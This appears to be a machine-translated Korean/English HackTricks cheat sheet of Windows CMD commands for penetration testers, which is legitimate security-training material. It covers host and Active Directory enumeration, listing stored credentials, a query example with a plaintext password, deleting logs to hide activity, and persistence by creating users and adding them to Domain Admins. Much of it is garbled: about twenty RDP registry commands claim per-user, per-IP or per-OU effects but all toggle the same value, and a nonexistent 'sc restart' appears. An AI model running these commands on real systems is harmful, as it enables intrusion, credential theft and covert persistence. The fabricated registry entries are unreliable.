# Basic Win CMD for Pentesters

## 기본 Win CMD for Pentesters

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가 수준까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>

### 시스템 정보

#### 버전 및 패치 정보

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```

#### 환경

#### Basic CMD commands for pentesters

#### 펜테스터를 위한 기본 CMD 명령어

**Networking**

**네트워킹**

**IP Configuration**

**IP 구성**

* **ipconfig** - Display IP configuration for all network interfaces.
* **ipconfig** - 모든 네트워크 인터페이스의 IP 구성을 표시합니다.

**Network Connections**

**네트워크 연결**

* **netstat -ano** - Display active network connections and listening ports.
* **netstat -ano** - 활성 네트워크 연결과 수신 대기 포트를 표시합니다.

**DNS**

**DNS**

* **nslookup** - Query DNS servers for DNS records.
* **nslookup** - DNS 레코드를 위해 DNS 서버에 쿼리합니다.

**Ping**

**핑**

* **ping** - Send ICMP echo requests to a specific IP address or domain.
* **ping** - 특정 IP 주소 또는 도메인에 ICMP 에코 요청을 보냅니다.

**Traceroute**

**Traceroute**

* **tracert** - Determine the route packets take to reach a destination IP address or domain.
* **tracert** - 패킷이 목적지 IP 주소 또는 도메인에 도달하는 경로를 결정합니다.

**Netcat**

**Netcat**

* **nc** - Utility for reading from and writing to network connections.
* **nc** - 네트워크 연결에서 읽고 쓰기 위한 유틸리티입니다.

**System Information**

**시스템 정보**

**System Information**

**시스템 정보**

* **systeminfo** - Display detailed configuration information about a computer and its operating system.
* **systeminfo** - 컴퓨터와 운영 체제에 대한 자세한 구성 정보를 표시합니다.

**Processes**

**프로세스**

* **tasklist** - Display a list of currently running processes.
* **tasklist** - 현재 실행 중인 프로세스 목록을 표시합니다.

**Services**

**서비스**

* **sc query** - Display the status of services on a local or remote machine.
* **sc query** - 로컬 또는 원격 컴퓨터의 서비스 상태를 표시합니다.

**Event Logs**

**이벤트 로그**

* **wevtutil** - Manage event logs from the command line.
* **wevtutil** - 명령 프롬프트에서 이벤트 로그를 관리합니다.

**File System**

**파일 시스템**

**Directory Listing**

**디렉터리 목록**

* **dir** - Display a list of files and subdirectories in a directory.
* **dir** - 디렉터리의 파일과 하위 디렉터리 목록을 표시합니다.

**File Manipulation**

**파일 조작**

* **copy** - Copy files from one location to another.
* **copy** - 파일을 한 위치에서 다른 위치로 복사합니다.
* **move** - Move files from one location to another.
* **move** - 파일을 한 위치에서 다른 위치로 이동합니다.
* **del** - Delete files.
* **del** - 파일을 삭제합니다.

**File Permissions**

**파일 권한**

* **icacls** - Display or modify file access control lists (ACLs).
* **icacls** - 파일 액세스 제어 목록(ACL)을 표시하거나 수정합니다.

**User Accounts**

**사용자 계정**

**Local Users**

**로컬 사용자**

* **net user** - Display or modify local user accounts.
* **net user** - 로컬 사용자 계정을 표시하거나 수정합니다.

**Local Groups**

**로컬 그룹**

* **net localgroup** - Display or modify local groups.
* **net localgroup** - 로컬 그룹을 표시하거나 수정합니다.

**User Privileges**

**사용자 권한**

* **whoami /priv** - Display the privileges of the current user.
* **whoami /priv** - 현재 사용자의 권한을 표시합니다.

**Registry**

**레지스트리**

**Registry Keys**

**레지스트리 키**

* **reg query** - Display the values and subkeys of a registry key.
* **reg query** - 레지스트리 키의 값을 및 하위 키를 표시합니다.

**Registry Values**

**레지스트리 값**

* **reg query** - Display the data for a specific registry value.
* **reg query** - 특정 레지스트리 값의 데이터를 표시합니다.

**Registry Modification**

**레지스트리 수정**

* **reg add** - Add a new registry key or value.
* **reg add** - 새로운 레지스트리 키 또는 값을 추가합니다.
* **reg delete** - Delete a registry key or value.
* **reg delete** - 레지스트리 키 또는 값을 삭제합니다.

**Miscellaneous**

**기타**

**Task Scheduler**

**작업 스케줄러**

* **schtasks** - Create, modify, or delete scheduled tasks.
* **schtasks** - 예약된 작업을 생성, 수정 또는 삭제합니다.

**Windows Firewall**

**Windows 방화벽**

* **netsh advfirewall** - Configure Windows Firewall settings.
* **netsh advfirewall** - Windows 방화벽 설정을 구성합니다.

**Windows Updates**

**Windows 업데이트**

* **wuauclt** - Control Windows Updates from the command line.
* **wuauclt** - 명령 프롬프트에서 Windows 업데이트를 제어합니다.

```bash
set #List all environment variables
```

다음은 강조해야 할 몇 가지 환경 변수입니다:

* **COMPUTERNAME**: 컴퓨터의 이름
* **TEMP/TMP:** 임시 폴더
* **USERNAME:** 사용자 이름
* **HOMEPATH/USERPROFILE:** 홈 디렉토리
* **windir:** C:\Windows
* **OS**: Windows 운영 체제
* **LOGONSERVER**: 도메인 컨트롤러의 이름
* **USERDNSDOMAIN**: DNS와 함께 사용할 도메인 이름
* **USERDOMAIN**: 도메인의 이름

```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```

#### 마운트된 디스크

Mounted disks are additional storage devices that have been attached to a computer system and made accessible for use. These disks can be physical devices, such as external hard drives or USB flash drives, or they can be virtual disks created within a virtual machine environment.

마운트된 디스크는 컴퓨터 시스템에 연결되어 사용할 수 있도록 추가 저장 장치입니다. 이 디스크는 외장 하드 드라이브나 USB 플래시 드라이브와 같은 물리적 장치일 수도 있으며, 가상 머신 환경 내에서 생성된 가상 디스크일 수도 있습니다.

```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```

#### [Defender](authentication-credentials-uac-and-efs/#defender)

#### 휴지통

```bash
dir C:\$Recycle.Bin /s /b
```

#### 프로세스, 서비스 및 소프트웨어

**List running processes**

**실행 중인 프로세스 목록**

To list all running processes on a Windows system, you can use the `tasklist` command in the command prompt.

Windows 시스템에서 실행 중인 모든 프로세스를 나열하려면 명령 프롬프트에서 `tasklist` 명령을 사용할 수 있습니다.

```plaintext
tasklist
```

**List services**

**서비스 목록**

To list all services on a Windows system, you can use the `sc` command in the command prompt.

Windows 시스템의 모든 서비스를 나열하려면 명령 프롬프트에서 `sc` 명령을 사용할 수 있습니다.

```plaintext
sc query
```

**List installed software**

**설치된 소프트웨어 목록**

To list all installed software on a Windows system, you can use the `wmic` command in the command prompt.

Windows 시스템에 설치된 모든 소프트웨어를 나열하려면 명령 프롬프트에서 `wmic` 명령을 사용할 수 있습니다.

```plaintext
wmic product get name,version
```

**Stop a service**

**서비스 중지**

To stop a service on a Windows system, you can use the `sc` command with the `stop` parameter in the command prompt.

Windows 시스템에서 서비스를 중지하려면 명령 프롬프트에서 `sc` 명령을 `stop` 매개변수와 함께 사용할 수 있습니다.

```plaintext
sc stop <service_name>
```

Replace `<service_name>` with the name of the service you want to stop.

`<service_name>`을 중지하려는 서비스의 이름으로 대체하세요.

**Start a service**

**서비스 시작**

To start a service on a Windows system, you can use the `sc` command with the `start` parameter in the command prompt.

Windows 시스템에서 서비스를 시작하려면 명령 프롬프트에서 `sc` 명령을 `start` 매개변수와 함께 사용할 수 있습니다.

```plaintext
sc start <service_name>
```

Replace `<service_name>` with the name of the service you want to start.

`<service_name>`을 시작하려는 서비스의 이름으로 대체하세요.

```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```

### 도메인 정보

#### Whois

Whois는 도메인에 대한 등록 정보를 검색하는 도구입니다. 일반적으로 도메인 소유자, 등록일, 만료일, 네임서버 등의 정보를 제공합니다.

```plaintext
whois <도메인>
```

#### DNS 정보

도메인 이름 시스템(DNS)은 도메인 이름을 IP 주소로 변환하는 역할을 합니다. DNS 정보를 확인하여 도메인에 연결된 IP 주소를 확인할 수 있습니다.

```plaintext
nslookup <도메인>
```

#### MX 레코드

MX(Mail Exchanger) 레코드는 도메인에 연결된 메일 서버의 정보를 제공합니다. MX 레코드를 확인하여 도메인과 관련된 메일 서버를 파악할 수 있습니다.

```plaintext
nslookup -type=mx <도메인>
```

#### SPF 레코드

SPF(Sender Policy Framework) 레코드는 도메인에서 발송되는 이메일을 인증하는 데 사용됩니다. SPF 레코드를 확인하여 도메인의 이메일 인증 설정을 확인할 수 있습니다.

```plaintext
nslookup -type=txt <도메인>
```

#### Zone Transfer

Zone Transfer는 DNS 서버에서 도메인에 대한 모든 레코드를 가져오는 과정입니다. Zone Transfer를 통해 도메인에 대한 상세한 정보를 얻을 수 있습니다.

```plaintext
nslookup
> server <DNS 서버>
> ls -d <도메인>
```

#### Subdomain

서브도메인은 기존 도메인의 하위 도메인으로, 서브도메인 스캐닝을 통해 도메인에 연결된 모든 서브도메인을 확인할 수 있습니다.

```plaintext
dnsrecon -d <도메인>
```

#### Zone Transfer 방지

Zone Transfer를 방지하기 위해 DNS 서버는 보안 설정을 해야 합니다. Zone Transfer 방지를 위해 다음과 같은 설정을 적용할 수 있습니다.

* DNS 서버에서 Zone Transfer를 허용하지 않도록 설정
* DNS 서버의 IP 주소를 알 수 없도록 설정
* DNS 서버의 소프트웨어 버전을 감추도록 설정

#### DNSSEC

DNSSEC(Domain Name System Security Extensions)는 DNS의 보안을 강화하는 기술입니다. DNSSEC를 사용하여 도메인의 DNS 데이터의 무결성과 인증을 보장할 수 있습니다.

#### 도메인 레지스트리

도메인 레지스트리는 도메인 이름을 관리하는 조직입니다. 도메인 레지스트리를 통해 도메인에 대한 추가 정보를 확인할 수 있습니다.

#### 도메인 레코드

도메인 레코드는 도메인에 대한 다양한 정보를 포함하는 데이터입니다. 도메인 레코드를 확인하여 도메인에 대한 상세한 정보를 파악할 수 있습니다.

```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list # Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

#### 로그 및 이벤트

**Windows 이벤트 로그**

Windows 운영 체제는 시스템 및 애플리케이션 이벤트에 대한 로그를 유지합니다. 이벤트 로그는 시스템 문제를 진단하고 보안 위협을 탐지하는 데 도움이 됩니다. 다음은 Windows 이벤트 로그의 유형입니다.

* **Application Log**: 애플리케이션에서 발생한 이벤트를 기록합니다.
* **Security Log**: 보안 관련 이벤트를 기록합니다. 예를 들어 로그인 시도, 계정 잠금 및 암호 변경과 같은 이벤트가 포함됩니다.
* **System Log**: 시스템 관련 이벤트를 기록합니다. 예를 들어 하드웨어 오류, 드라이버 문제 및 서비스 중지와 같은 이벤트가 포함됩니다.

**이벤트 로그 검토**

이벤트 로그를 검토하여 시스템에 대한 정보를 얻을 수 있습니다. 다음은 이벤트 로그를 검토하는 몇 가지 유용한 명령어입니다.

* **wevtutil**: 이벤트 로그를 관리하는 데 사용되는 명령어입니다. 로그를 내보내거나 가져오는 데 사용할 수 있습니다.
* **eventvwr**: Windows 이벤트 뷰어를 엽니다. 이를 통해 이벤트 로그를 시각적으로 검토할 수 있습니다.

**로그 파일 위치**

Windows 이벤트 로그 파일은 다음 위치에 저장됩니다.

* **Application Log**: C:\Windows\System32\winevt\Logs\Application.evtx
* **Security Log**: C:\Windows\System32\winevt\Logs\Security.evtx
* **System Log**: C:\Windows\System32\winevt\Logs\System.evtx

**로그 파일 분석**

로그 파일을 분석하여 시스템에 대한 정보를 추출할 수 있습니다. 다음은 로그 파일을 분석하는 몇 가지 유용한 도구입니다.

* **Event Log Explorer**: Windows 이벤트 로그를 분석하는 데 사용되는 강력한 도구입니다.
* **LogParser**: 로그 파일을 쿼리하고 분석하는 데 사용되는 명령줄 도구입니다.

**로그 파일 삭제**

로그 파일을 삭제하여 시스템에서 발생한 활동을 숨길 수 있습니다. 다음은 로그 파일을 삭제하는 몇 가지 유용한 명령어입니다.

* **wevtutil**: 이벤트 로그를 삭제하는 데 사용되는 명령어입니다.
* **sdelete**: 로그 파일을 안전하게 삭제하는 데 사용되는 명령줄 도구입니다.

```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```

#### 사용자

**사용자 계정 만들기**

```bash
net user <username> <password> /add
```

**사용자 계정 삭제하기**

```bash
net user <username> /delete
```

**사용자 계정 비밀번호 변경하기**

```bash
net user <username> <new_password>
```

**사용자 계정 정보 보기**

```bash
net user <username>
```

#### 그룹

**그룹 만들기**

```bash
net localgroup <groupname> /add
```

**그룹 삭제하기**

```bash
net localgroup <groupname> /delete
```

**그룹에 사용자 추가하기**

```bash
net localgroup <groupname> <username> /add
```

**그룹에서 사용자 제거하기**

```bash
net localgroup <groupname> <username> /delete
```

**그룹 정보 보기**

```bash
net localgroup <groupname>
```

### 서비스

#### 서비스 보기

```bash
sc query
```

#### 서비스 시작하기

```bash
sc start <servicename>
```

#### 서비스 중지하기

```bash
sc stop <servicename>
```

#### 서비스 재시작하기

```bash
sc restart <servicename>
```

#### 서비스 설정 변경하기

```bash
sc config <servicename> <option>
```

#### 서비스 삭제하기

```bash
sc delete <servicename>
```

### 태스크 스케줄러

#### 태스크 스케줄러 보기

```bash
schtasks /query
```

#### 태스크 스케줄러 만들기

```bash
schtasks /create /tn <taskname> /tr <command> /sc <schedule> /st <starttime>
```

#### 태스크 스케줄러 삭제하기

```bash
schtasks /delete /tn <taskname> /f
```

#### 태스크 스케줄러 실행하기

```bash
schtasks /run /tn <taskname>
```

#### 태스크 스케줄러 중지하기

```bash
schtasks /end /tn <taskname>
```

```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

#### 그룹

**목적**

그룹은 사용자를 논리적으로 그룹화하여 리소스에 대한 액세스 권한을 관리하는 데 사용됩니다. 그룹을 사용하면 사용자에게 일괄적으로 권한을 할당하고, 리소스에 대한 액세스를 쉽게 제어할 수 있습니다.

**그룹 생성**

그룹을 생성하려면 다음 명령을 사용합니다.

```plaintext
net group /add [그룹 이름]
```

**그룹에 사용자 추가**

그룹에 사용자를 추가하려면 다음 명령을 사용합니다.

```plaintext
net group [그룹 이름] [사용자 이름] /add
```

**그룹에서 사용자 제거**

그룹에서 사용자를 제거하려면 다음 명령을 사용합니다.

```plaintext
net group [그룹 이름] [사용자 이름] /delete
```

**그룹 멤버십 확인**

그룹의 멤버십을 확인하려면 다음 명령을 사용합니다.

```plaintext
net group [그룹 이름]
```

**그룹 삭제**

그룹을 삭제하려면 다음 명령을 사용합니다.

```plaintext
net group [그룹 이름] /delete
```

```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```

#### 세션 목록

To list the active sessions in a Windows system, you can use the following command:

```plaintext
C:\> net session
```

This command will display a list of all active sessions on the system, including the username, computer name, and session ID.

```
qwinsta
klist sessions
```

#### 암호 정책

A password policy is a set of rules and requirements that dictate how passwords should be created and used within a system. It is an important aspect of security as weak passwords can be easily guessed or cracked, leaving systems vulnerable to unauthorized access.

암호 정책은 시스템 내에서 암호를 생성하고 사용하는 방법을 규정하는 규칙과 요구사항의 집합입니다. 약한 암호는 쉽게 추측되거나 크랙될 수 있으므로, 암호 정책은 보안의 중요한 측면입니다. 이는 시스템이 무단 접근에 취약해지는 것을 방지합니다.

Some common password policy requirements include:

일반적인 암호 정책 요구사항은 다음과 같습니다:

* Minimum password length: Specifies the minimum number of characters a password must have.
* 최소 암호 길이: 암호가 가져야 하는 최소 문자 수를 지정합니다.
* Complexity requirements: Specifies that passwords must contain a combination of uppercase and lowercase letters, numbers, and special characters.
* 복잡성 요구사항: 암호는 대문자, 소문자, 숫자, 특수 문자의 조합을 포함해야 합니다.
* Password expiration: Specifies a time period after which a password must be changed.
* 암호 만료: 암호를 변경해야 하는 시간 기간을 지정합니다.
* Password history: Specifies the number of previous passwords that cannot be reused.
* 암호 기록: 재사용할 수 없는 이전 암호의 수를 지정합니다.
* Account lockout: Specifies the number of failed login attempts before an account is locked.
* 계정 잠금: 계정이 잠기기 전에 실패한 로그인 시도 횟수를 지정합니다.

By implementing a strong password policy, organizations can significantly enhance the security of their systems and protect sensitive information from unauthorized access.

강력한 암호 정책을 시행함으로써, 조직은 시스템의 보안을 크게 향상시킬 수 있으며, 무단 접근으로부터 민감한 정보를 보호할 수 있습니다.

```
net accounts
```

#### 자격 증명

Credentials are the information used to authenticate and authorize a user or system. In the context of hacking, obtaining credentials is a common objective as it can provide unauthorized access to systems or accounts. There are various techniques and tools that can be used to obtain credentials, such as password cracking, phishing, keylogging, and credential stuffing. It is important for pentesters to understand how credentials are stored and protected in order to effectively test the security of a system.

```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```

#### 사용자를 이용한 지속성

**Add a user to the local administrators group**

**로컬 관리자 그룹에 사용자 추가**

```plaintext
net user /add <username> <password>
net localgroup administrators <username> /add
```

**Add a user to the remote desktop users group**

**원격 데스크톱 사용자 그룹에 사용자 추가**

```plaintext
net localgroup "Remote Desktop Users" <username> /add
```

**Add a user to the domain administrators group**

**도메인 관리자 그룹에 사용자 추가**

```plaintext
net group "Domain Admins" <username> /add /domain
```

**Add a user to the domain remote desktop users group**

**도메인 원격 데스크톱 사용자 그룹에 사용자 추가**

```plaintext
net group "Remote Desktop Users" <username> /add /domain
```

**Enable remote desktop**

**원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

**Disable remote desktop**

**원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

**Enable remote desktop on a specific port**

**특정 포트에서 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d <port_number> /f
```

**Disable remote desktop on a specific port**

**특정 포트에서 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0 /f
```

**Enable remote desktop on all network interfaces**

**모든 네트워크 인터페이스에서 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v ListenOnAllInterfaces /t REG_DWORD /d 1 /f
```

**Disable remote desktop on all network interfaces**

**모든 네트워크 인터페이스에서 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v ListenOnAllInterfaces /t REG_DWORD /d 0 /f
```

**Enable remote desktop for a specific user**

**특정 사용자를 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Disable remote desktop for a specific user**

**특정 사용자를 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Enable remote desktop for multiple users**

**다중 사용자를 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for multiple users**

**다중 사용자를 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all users**

**모든 사용자를 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all users**

**모든 사용자를 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific group**

**특정 그룹을 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific group**

**특정 그룹을 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all groups**

**모든 그룹을 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all groups**

**모든 그룹을 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific domain**

**특정 도메인을 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific domain**

**특정 도메인을 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all domains**

**모든 도메인을 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all domains**

**모든 도메인을 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific IP address**

**특정 IP 주소를 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific IP address**

**특정 IP 주소를 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all IP addresses**

**모든 IP 주소를 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all IP addresses**

**모든 IP 주소를 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific subnet**

**특정 서브넷을 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific subnet**

**특정 서브넷을 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all subnets**

**모든 서브넷을 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all subnets**

**모든 서브넷을 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific OU**

**특정 OU를 위한 원격 데스크톱 활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific OU**

**특정 OU를 위한 원격 데스크톱 비활성화**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```

### 네트워크

#### 인터페이스, 라우트, 포트, 호스트 및 DNS 캐시

```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

